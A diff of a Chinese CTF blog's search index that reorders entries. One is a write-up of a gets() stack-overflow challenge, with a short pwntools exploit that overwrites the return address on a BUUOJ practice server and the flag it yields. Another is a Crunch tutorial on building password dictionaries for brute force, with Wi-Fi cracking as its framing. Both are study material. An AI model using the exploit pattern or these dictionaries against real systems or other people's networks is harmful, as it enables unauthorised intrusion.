@@ -80,37 +80,6 @@ shift+F12 看一下</p>
       </tags>
   </entry>
   <entry>
-    <title>Rip覆盖</title>
-    <url>/Rip%E8%A6%86%E7%9B%96/</url>
-    <content><![CDATA[<p>实属栈溢出.<br />
-<a id="more"></a><br />
-<img data-src="https://i.loli.net/2021/01/27/LsrJ4dpjkzXOnQl.png" alt="" /></p>
-<h2 id="启动ida"><a class="anchor" href="#启动ida">#</a> 启动 IDA</h2>
-<p><img data-src="https://i.loli.net/2021/01/27/6YANSFgolme5ZDB.png" alt="" /></p>
-<p>这个 gets 没有限制输入，存在栈溢出漏洞.</p>
-<p><img data-src="https://i.loli.net/2021/01/27/MtCuZR9sfJaQdoV.png" alt="" /></p>
-<p>需要我们输入来获取 flag;</p>
-<p>在 main 函数下还有一个 fun 函数；我们可以点开看看看</p>
-<p><img data-src="https://i.loli.net/2021/01/27/TatPnLBF3CpOQsi.png" alt="" /></p>
-<p>是一个系统调用且 start at 401186 (待会 payload 可以用到)</p>
-<p>双击 s 来到 stack of main 视图，这里了解了我们只需存入 15 个字节即可劫持函数返回地址<br />
-<img data-src="https://ftp.bmp.ovh/imgs/2021/01/e6e423001264fe86.png" alt="" /></p>
-<p>IDA 方面进行的差不多了，下面可以开始着手写脚本了</p>
-<h2 id="构造exp"><a class="anchor" href="#构造exp">#</a> 构造 exp</h2>
-<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre>h<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">27829</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">15</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x401186</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>h<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>h<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h2 id="执行"><a class="anchor" href="#执行">#</a> 执行</h2>
-<p><img data-src="https://ftp.bmp.ovh/imgs/2021/01/3b7387aaa01d232f.png" alt="" /></p>
-<p>刚开始还不知道要干什么，以为又是脚本写错了，后来才发觉是要执行 cat /flag 命令</p>
-<p><img data-src="https://ftp.bmp.ovh/imgs/2021/01/ff3701318adda06f.png" alt="" /></p>
-<p>get <span class="spoiler bulr" title="快走开(╯▔皿▔)╯">flag{8bf972eb-867d-485b-94d5-737f5bc12947}</span></p>
-]]></content>
-      <categories>
-        <category>wp</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>RSA加密算法详细解说</title>
     <url>/RSA%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E8%AF%A6%E7%BB%86%E8%A7%A3%E8%AF%B4/</url>
     <content><![CDATA[<p>RSA 加密算法是一种非对称加密算法，加密由公钥，私钥，明文，密文四部分组成.<br />
@@ -163,6 +132,37 @@ a^φ(n) = a × a^(φ(n)−1)≡1(modn)</p>
       </categories>
       <tags>
         <tag>crypto</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Rip覆盖</title>
+    <url>/Rip%E8%A6%86%E7%9B%96/</url>
+    <content><![CDATA[<p>实属栈溢出.<br />
+<a id="more"></a><br />
+<img data-src="https://i.loli.net/2021/01/27/LsrJ4dpjkzXOnQl.png" alt="" /></p>
+<h2 id="启动ida"><a class="anchor" href="#启动ida">#</a> 启动 IDA</h2>
+<p><img data-src="https://i.loli.net/2021/01/27/6YANSFgolme5ZDB.png" alt="" /></p>
+<p>这个 gets 没有限制输入，存在栈溢出漏洞.</p>
+<p><img data-src="https://i.loli.net/2021/01/27/MtCuZR9sfJaQdoV.png" alt="" /></p>
+<p>需要我们输入来获取 flag;</p>
+<p>在 main 函数下还有一个 fun 函数；我们可以点开看看看</p>
+<p><img data-src="https://i.loli.net/2021/01/27/TatPnLBF3CpOQsi.png" alt="" /></p>
+<p>是一个系统调用且 start at 401186 (待会 payload 可以用到)</p>
+<p>双击 s 来到 stack of main 视图，这里了解了我们只需存入 15 个字节即可劫持函数返回地址<br />
+<img data-src="https://ftp.bmp.ovh/imgs/2021/01/e6e423001264fe86.png" alt="" /></p>
+<p>IDA 方面进行的差不多了，下面可以开始着手写脚本了</p>
+<h2 id="构造exp"><a class="anchor" href="#构造exp">#</a> 构造 exp</h2>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre>h<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">27829</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">15</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x401186</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>h<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>h<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h2 id="执行"><a class="anchor" href="#执行">#</a> 执行</h2>
+<p><img data-src="https://ftp.bmp.ovh/imgs/2021/01/3b7387aaa01d232f.png" alt="" /></p>
+<p>刚开始还不知道要干什么，以为又是脚本写错了，后来才发觉是要执行 cat /flag 命令</p>
+<p><img data-src="https://ftp.bmp.ovh/imgs/2021/01/ff3701318adda06f.png" alt="" /></p>
+<p>get <span class="spoiler bulr" title="快走开(╯▔皿▔)╯">flag{8bf972eb-867d-485b-94d5-737f5bc12947}</span></p>
+]]></content>
+      <categories>
+        <category>wp</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
       </tags>
   </entry>
   <entry>
@@ -313,6 +313,32 @@ if(preg_match(&quot;/or|-|\|/|\*|&lt;|&gt;|!|x|hex|(|)|+|select/i&quot;,$id))<br
       </tags>
   </entry>
   <entry>
+    <title>想蹭网先解开密码&amp;Crunch密码生成器</title>
+    <url>/%E6%83%B3%E8%B9%AD%E7%BD%91%E5%85%88%E8%A7%A3%E5%BC%80%E5%AF%86%E7%A0%81-Crunch%E5%AF%86%E7%A0%81%E7%94%9F%E6%88%90%E5%99%A8/</url>
+    <content><![CDATA[<p>Crunch 普遍用于生成密码字典，配合其他工具使用进行暴力破解。作为 kali linux 下前十名最常使用的工具之一，用途非常广泛。<br />
+<a id="more"></a></p>
+<h3 id="-t-命令如下"><a class="anchor" href="#-t-命令如下">#</a> -t 命令如下:</h3>
+<p>-t '@'/','/'%'/'<sup>', 指定模式，'@'/','/'%'/'</sup>' 分别代表意义如下:</p>
+<p>@ 插入小写字母<br />
+，插入大写字母<br />
+ % 插入数字<br />
+ ^ 插入特殊符号<br />
+使用实例：(当确定使用的对象类型但不具体知道是那些时可以使用占位符)<br />
+ 例 1:<br />
+ 生成缺位的手机号码 (有可能作为路由器密码或 wifi 密码（8-11 位）)<br />
+ 命令：crunch 11 11   -t  1503453%%%%   -o 1.txt 或 &gt;&gt; 1.txt (以 % 位数字占位符)<br />
+ 例二:<br />
+crunch 4 4  + + 123 + -t %%@^</p>
+<p>生成 4 位密码，其中格式为 &quot;两个数字&quot;+&quot;一个小写字母&quot;+&quot;常见符号&quot;(其中数字这里被指定只能为 123 组成的所有 2 位数字组合). 比如 12f#,32j^,13t$...etc..</p>
+]]></content>
+      <categories>
+        <category>wp&amp;wiki</category>
+      </categories>
+      <tags>
+        <tag>misc</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>请问大吉杯的签到是在这里签吗?</title>
     <url>/%E8%AF%B7%E9%97%AE%E5%A4%A7%E5%90%89%E6%9D%AF%E7%9A%84%E7%AD%BE%E5%88%B0%E6%98%AF%E5%9C%A8%E8%BF%99%E9%87%8C%E7%AD%BE%E5%90%97/</url>
     <content><![CDATA[<p>之前没接触过 zlib 文件格式；一直在思考如何将文件中的 zlib 解压，这一题整整忙了我两天.<br />
@@ -354,32 +380,6 @@ if(preg_match(&quot;/or|-|\|/|\*|&lt;|&gt;|!|x|hex|(|)|+|select/i&quot;,$id))<br
 ]]></content>
       <categories>
         <category>wp</category>
-      </categories>
-      <tags>
-        <tag>misc</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>想蹭网先解开密码&amp;Crunch密码生成器</title>
-    <url>/%E6%83%B3%E8%B9%AD%E7%BD%91%E5%85%88%E8%A7%A3%E5%BC%80%E5%AF%86%E7%A0%81-Crunch%E5%AF%86%E7%A0%81%E7%94%9F%E6%88%90%E5%99%A8/</url>
-    <content><![CDATA[<p>Crunch 普遍用于生成密码字典，配合其他工具使用进行暴力破解。作为 kali linux 下前十名最常使用的工具之一，用途非常广泛。<br />
-<a id="more"></a></p>
-<h3 id="-t-命令如下"><a class="anchor" href="#-t-命令如下">#</a> -t 命令如下:</h3>
-<p>-t '@'/','/'%'/'<sup>', 指定模式，'@'/','/'%'/'</sup>' 分别代表意义如下:</p>
-<p>@ 插入小写字母<br />
-，插入大写字母<br />
- % 插入数字<br />
- ^ 插入特殊符号<br />
-使用实例：(当确定使用的对象类型但不具体知道是那些时可以使用占位符)<br />
- 例 1:<br />
- 生成缺位的手机号码 (有可能作为路由器密码或 wifi 密码（8-11 位）)<br />
- 命令：crunch 11 11   -t  1503453%%%%   -o 1.txt 或 &gt;&gt; 1.txt (以 % 位数字占位符)<br />
- 例二:<br />
-crunch 4 4  + + 123 + -t %%@^</p>
-<p>生成 4 位密码，其中格式为 &quot;两个数字&quot;+&quot;一个小写字母&quot;+&quot;常见符号&quot;(其中数字这里被指定只能为 123 组成的所有 2 位数字组合). 比如 12f#,32j^,13t$...etc..</p>
-]]></content>
-      <categories>
-        <category>wp&amp;wiki</category>
       </categories>
       <tags>
         <tag>misc</tag>
